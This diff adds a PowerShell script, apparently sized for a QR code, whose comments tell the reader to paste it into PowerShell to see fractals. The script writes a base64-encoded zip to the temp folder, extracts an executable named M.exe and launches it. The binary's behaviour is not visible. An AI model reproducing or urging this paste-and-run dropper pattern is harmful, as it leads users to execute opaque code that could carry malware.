@@ -1,0 +1,15 @@
+#:: --- Open on Windows PC ---
+#:: 1. Copy whole text.
+#:: 2. Paste into PowerShell.
+#:: 3. Enjoy Fractals!
+#:: ---------------
+$d = Join-Path $env:temp 'M_105HDGDL69';
+New-Item -ItemType Directory -Path $d -Force | Out-Null;
+$z = Join-Path $d 'z.zip';
+[io.file]::WriteAllBytes($z, [Convert]::FromBase64String('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'));
+Expand-Archive $z $d -Force;
+Remove-Item $z -Force;
+cd $d;
+Start-Process '.\M.exe';
+exit;
+#These are the last possible bytes that fit on the QR-Code. Have a good day!!!
